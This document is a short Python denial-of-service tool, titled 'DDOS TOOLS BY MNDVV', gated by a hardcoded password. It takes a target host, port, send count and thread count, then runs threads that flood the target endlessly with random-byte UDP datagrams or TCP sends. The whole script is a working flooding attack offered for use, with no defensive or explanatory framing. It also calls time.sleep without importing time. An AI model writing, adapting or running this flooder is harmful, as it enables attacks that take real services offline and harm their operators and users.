
import random
import socket
import threading

print('''DDOS TOOLS BY MNDVV''')

password = input("Password : ")
if password == "MoonDev":
    print("correct password")
    time.sleep(2)
else :
    print("Password wrong")
    time.sleep(100000000000000000000000000000)
ip = str(input("HOST:"))
port = int(input("PORT:"))
times = int(input("TIMES:"))
threads = int(input("THREAD:"))
choice = str(input("Are You Sure? (y):"))
def run():
	data = random._urandom(1025)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print("!! RetZ x Xd Team!!!")
		except:
			print("!! JEBOLL !!!")

def run2():
	data = random._urandom(150)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print("!! RetZ x Xd Team!!!")
		except:
			s.close()
			print("!! JEBOLL !!!")

for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()
